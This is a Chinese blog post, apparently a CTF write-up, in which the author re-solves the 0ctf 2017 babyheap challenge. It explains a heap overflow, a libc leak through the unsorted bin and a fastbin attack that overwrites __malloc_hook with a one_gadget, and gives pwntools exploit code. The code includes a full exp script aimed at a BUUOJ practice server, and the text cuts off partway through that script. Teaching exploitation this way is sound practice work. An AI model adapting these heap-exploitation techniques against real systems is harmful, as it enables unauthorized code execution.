@@ -1,0 +1,284 @@
+<!-- 雪花特效 -->
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script><!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>100days_0ctf_babyheap | s4ndw1ch's Blog</title><meta name="author" content="s4ndw1ch"><meta name="copyright" content="s4ndw1ch"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="100days_0ctf_babyheap前言我把这道pwn题归到我的个人感悟这个类别中，且标题前面是100days 没错可能已经有读者能猜到，这道题是我100天前入门堆利用的第一道题，在8月的最后一天，在公司实习无聊时，再次做了一下100天前让自己无从下手，望而生畏的堆题，第一次做的时候真的是打击信心，险些想放弃学习pwn，但是现在再看，轻舟已过万重山，这题做起来已经非常得心应手了，属于一眼出思">
+<meta property="og:type" content="article">
+<meta property="og:title" content="100days_0ctf_babyheap">
+<meta property="og:url" content="http://s4ndw1ch136.github.io/post/444d8fc0.html">
+<meta property="og:site_name" content="s4ndw1ch&#39;s Blog">
+<meta property="og:description" content="100days_0ctf_babyheap前言我把这道pwn题归到我的个人感悟这个类别中，且标题前面是100days 没错可能已经有读者能猜到，这道题是我100天前入门堆利用的第一道题，在8月的最后一天，在公司实习无聊时，再次做了一下100天前让自己无从下手，望而生畏的堆题，第一次做的时候真的是打击信心，险些想放弃学习pwn，但是现在再看，轻舟已过万重山，这题做起来已经非常得心应手了，属于一眼出思">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://s4ndw1ch136.github.io/img/wallhaven-9mjoy1.png">
+<meta property="article:published_time" content="2023-08-31T12:59:51.000Z">
+<meta property="article:modified_time" content="2023-09-01T03:35:30.157Z">
+<meta property="article:author" content="s4ndw1ch">
+<meta property="article:tag" content="感悟">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://s4ndw1ch136.github.io/img/wallhaven-9mjoy1.png"><link rel="shortcut icon" href="/img/a.jpg"><link rel="canonical" href="http://s4ndw1ch136.github.io/post/444d8fc0.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '100days_0ctf_babyheap',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-09-01 11:35:30'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/mouse.css"><link rel="stylesheet" href="/css/touming.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/a.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">43</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about"><i class="fa-fw /about/"></i><span> 0</span></a></li><li><a class="site-page child" href="/myself"><i class="fa-fw /myself/"></i><span> 1</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/wallhaven-9mjoy1.png')"><nav id="nav"><span id="blog-info"><a href="/" title="s4ndw1ch's Blog"><span class="site-name">s4ndw1ch's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about"><i class="fa-fw /about/"></i><span> 0</span></a></li><li><a class="site-page child" href="/myself"><i class="fa-fw /myself/"></i><span> 1</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">100days_0ctf_babyheap</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-08-31T12:59:51.000Z" title="Created 2023-08-31 20:59:51">2023-08-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-09-01T03:35:30.157Z" title="Updated 2023-09-01 11:35:30">2023-09-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/My-personal-reflection/">My personal reflection</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="100days_0ctf_babyheap"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="100days-0ctf-babyheap"><a href="#100days-0ctf-babyheap" class="headerlink" title="100days_0ctf_babyheap"></a>100days_0ctf_babyheap</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我把这道pwn题归到我的个人感悟这个类别中，且标题前面是100days</p>
+<p>没错可能已经有读者能猜到，这道题是我100天前入门堆利用的第一道题，在8月的最后一天，在公司实习无聊时，再次做了一下100天前让自己无从下手，望而生畏的堆题，第一次做的时候真的是打击信心，险些想放弃学习pwn，但是现在再看，轻舟已过万重山，这题做起来已经非常得心应手了，属于一眼出思路，而且我又把当时参考的wp拿出来看了一下，甚至觉得自己写的这份exp更简单粗暴，从一开始对着wp都一知半解，到自己流畅地独立完成getshell，中间相隔100来天，挺多感慨，坚持不断的pwn学习不仅让我有技术层面的进步，还让我找到了一份不错的实习机会，伙食补贴,交通补贴,每周还有两次下午的盒装水果，且薪资甚至高出不少大厂的日薪，算是第一次真的意义上感受到学习带给自己的好处，如果现在的你迷茫不知所措，请停止焦虑，静下心来，你只管坚持，终会有一天你会和我一样看到坚持下来的意义，可能不是100天，只要50天，也可能200天，但是不管多久，总有这么一天</p>
+<h2 id="再探0ctf-babyheap"><a href="#再探0ctf-babyheap" class="headerlink" title="再探0ctf_babyheap"></a>再探0ctf_babyheap</h2><p>先放两个当初我参考的wp，当时参考了也还是懵懵懂懂的</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1764339">https://cloud.tencent.com/developer/article/1764339</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/108360375">https://blog.csdn.net/mcmuyanga/article/details/108360375</a></p>
+<p>看这道题的wp的师傅们大多数应该都是处于入门水平，所以这里我自己的wp我会解释的详细一点，每一步带着进行调试</p>
+<h3 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h3><p>第一步还是先看一下保护开了哪些</p>
+<p><img src="/post/444d8fc0/1.PNG" alt="1"></p>
+<p>全绿，如果没记错，这也是我当初第一次做的保护全开的pwn，</p>
+<p>第一次看到这个全绿的场景多多少少是有点发怵的，但是不用怕，因为对于堆利用来说，其实影响是不太大的，魔高一尺道高一丈，我们会有许多的手段来应对</p>
+<h3 id="本地调试"><a href="#本地调试" class="headerlink" title="本地调试"></a>本地调试</h3><p><img src="/post/444d8fc0/2.PNG" alt="2"></p>
+<p>本地来看的话是四个有用的功能，功能还是很齐全的</p>
+<h3 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><h4 id="add"><a href="#add" class="headerlink" title="add():"></a>add():</h4><p><img src="/post/444d8fc0/3.PNG" alt="3"></p>
+<p>add创建chunk功能对应choice:1,没什么特别的，只不过这里用的calloc去申请chunk，其特性为：在申请时会清空数据，还有关于tcache的申请特性这里先不介绍了，因为这里的ubuntu环境是16.04没有引用tcache，感兴趣的师傅可自行百度，不过这里calloc无太大影响</p>
+<p>自动化交互函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Command:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="fill"><a href="#fill" class="headerlink" title="fill():"></a>fill():</h4><p><img src="/post/444d8fc0/5.PNG" alt="5"></p>
+<p>再看fill功能对应choice ：2，这里问题就很大了，也是本题漏洞点，首先会让我们输入index，也就是选择相应chunk，然后让我们输入size，并且后续我们可以输入的content大小就是根据我们这里输入的size决定的，那么就造成了堆溢出，比如我们先使用1创建了0x10size的chunk，这里我们重新输入size0x20，那么就可以溢出到下个chunk，修改其presize，size，fd，bk指针等重要字段，这里注意我们输入size是多少，我们就要填充对应的大小的内容，否则不会break</p>
+<p>自动化交互函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index,size,content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Command:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	io.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="free"><a href="#free" class="headerlink" title="free():"></a>free():</h4><p>free功能对应choice ：3，正常的free且指针置0了不存在UAF</p>
+<p><img src="/post/444d8fc0/6.PNG" alt="6"></p>
+<p>自动化交互函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Command:&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>show():</p>
+<p>show打印功能对应choice：4，打印我们chunk的内容</p>
+<p><img src="/post/444d8fc0/7.PNG" alt="7"></p>
+<p>自动化交互函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Command:&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure>
+
+<h3 id="思路整理"><a href="#思路整理" class="headerlink" title="思路整理"></a>思路整理</h3><p>首先IDA静态分析下来我们可以发现漏洞位于fill()模块，能造成堆溢出,那么我们可以用这个堆溢出做些什么呢，</p>
+<p>我们先想一下我们最终要达到怎样的利用效果，这里保护是全部开启的，我们无法攻击got表，一般我们可以选择攻击hook函数，也就是钩子函数，这个东西是什么，我们gdb调试看一下</p>
+<p><img src="/post/444d8fc0/8.PNG" alt="8"></p>
+<p>我们看到glibc2.23-64位下位于&amp;main_arena-0x10的位置，如果malloc_hook里有值，我们调用malloc时会拦截该调用并执行我们自定义的代码，如果我们这个地方放上one_gadget,或者我们构造的shellcode的地址当然这里NX开启不能执行，我们选择one_gadget，再去申请堆块时就实现了getshell，这里用calloc调用同样会触发</p>
+<p>我们可以用工具one_gadget去查找libc中合适的地址</p>
+<p><img src="/post/444d8fc0/9.PNG" alt="9"></p>
+<p>我们得到的只是静态地址，无法直接使用，我们还需要得到libc的加载基地址，那么如何去获取这个基址，在堆利用中我们通常借助unsortedbin去泄露libc因为unsortedbin 有一个特性，就是如果 unsortedbin 只有一个 bin ，它的 fd 和 bk 指针会指向同一个地址(unsorted bin 链表的头部），这个地址为 main_arena + 0x58</p>
+<p><img src="/post/444d8fc0/10.PNG" alt="10"></p>
+<p>还记得上面malloc_hook在哪吗？,&amp;main_arena-0x10,那么如果我们得到了这个main_arena+88的地址，我们的libc基址就可以表示为 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_addr = addr - <span class="number">88</span> -<span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>如果有UAF就很简单了，直接释放一个chunk进unsortedbin中再打印出来即可，但是这里我们是没有UAF可以利用的，我们只有一个堆溢出，释放了的chunk就不能使用show了，那有没有什么办法可以让一个没有释放的chunk也能存在这个地址呢，也就是我们没有释放这个chunk，但是它却在unsortedbin中</p>
+<p>假设我们现在创建了3个chunk，如果我们chunk0，chunk1，chunk2，如果释放chunk0，可以连带着chunk1进入unsortedbin的话，相当于chunk1的指针还是存在的，我们还可以使用，那么该怎么做，我们可以利用堆溢出修改chunk的size位，把它的size改大，直到包含住下一个chunk不就可以了吗</p>
+<p>我们先创建四个chunk</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>)  <span class="comment">#0         </span></span><br><span class="line">add(<span class="number">0x60</span>)  <span class="comment">#1	</span></span><br><span class="line">add(<span class="number">0x60</span>)  <span class="comment">#2	</span></span><br><span class="line">add(<span class="number">0x60</span>)  <span class="comment">#3	</span></span><br></pre></td></tr></table></figure>
+
+<p>第四个chunk用来防止free时和topchunk合并</p>
+<p>那么我们现在去填充0，溢出到1的size位</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fill(<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x70</span>+<span class="number">0x71</span>))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/post/444d8fc0/11.PNG" alt="11"></p>
+<p>可以看到，chunk1的size成功被我们修改为了0xe1，此时再去释放chunk1就会连带chunk2也给放进unsortedbin</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/post/444d8fc0/12.PNG" alt="12"></p>
+<p>如果我们再把chunk1申请出来，那么chunk2的fd和bk指针就指向unsortedbin了，且chunk2的malloc指针也是存在的，我们可以对其进行打印</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>)  <span class="comment">#1   </span></span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)  </span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span> -<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">one = <span class="number">0x4526a</span> + libc_addr</span><br></pre></td></tr></table></figure>
+
+<p><img src="/post/444d8fc0/13.PNG" alt="13"></p>
+<p>那么第一步泄露地址就完成了，接下来要攻击malloc_hook,这里选择fastbin_attack,伪造malloc_hook附近的地址为一个fastbin申请过来就可以修改malloc_hook了，可以看到我上面申请的chunk的都是0x60，free后就进了0x70的fastbin，这是一个小技巧，因为像0x7f这样的值我们比较容易找到，方便我们去伪造</p>
+<p>通常64位malloc_hook-0x23的位置就是适合我们去伪造fastbin的位置</p>
+<p><img src="/post/444d8fc0/14.PNG" alt="14"></p>
+<p>这里可以被当成一个0x70的chunk</p>
+<p>我们先把chunk2申请回来此时再申请的相当于chunk4，再放进fastbin,注意此时有两个指针指向了同一块地址，chunk2和chunk4指向的同一块地址修改2，对应chunk4的内容也是跟着一起修改的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>)  <span class="comment">#4       *2,4 -&gt; 2  </span></span><br><span class="line">free(<span class="number">4</span>) </span><br></pre></td></tr></table></figure>
+
+<p><img src="/post/444d8fc0/15.PNG" alt="15"></p>
+<p>我们直接修改chunk2的fd，对应被放进fastbin的chunk4的fd也会跟着修改</p>
+<p><img src="/post/444d8fc0/16.PNG" alt="16"></p>
+<p>我们再申请两次就可以申请到我们想要的地址了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>)  <span class="comment">#4   </span></span><br><span class="line">add(<span class="number">0x60</span>)  <span class="comment">#5</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的chunk5就是我们的目标chunk，malloc_hook-0x23的位置，但是由于会用0x10来提供给presize和size位，其实我们是从malloc_hook-0x13的位置开始编辑的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>)+p64(one)</span><br><span class="line">fill(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/post/444d8fc0/17.PNG" alt="17"></p>
+<p>这个时候malloc_hook就已经被我们填入了one_gadget再add一次就getshell了</p>
+<h3 id="全部exp"><a href="#全部exp" class="headerlink" title="全部exp:"></a>全部exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27787</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./babyheap_0ctf_2017&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyheap_0ctf_2017&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23-64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Command:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index,size,content</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Command:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	io.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Command:&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Command:&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)  <span class="comment">#0         </span></span><br><span class="line">add(<span class="number">0x60</span>)  <span class="comment">#1	</span></span><br><span class="line">add(<span class="number">0x60</span>)  <span class="comment">#2	</span></span><br><span class="line">add(<span class="number">0x60</span>)  <span class="comment">#3	</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x70</span>+<span class="number">0x71</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)  <span class="comment">#1   </span></span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)  </span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span 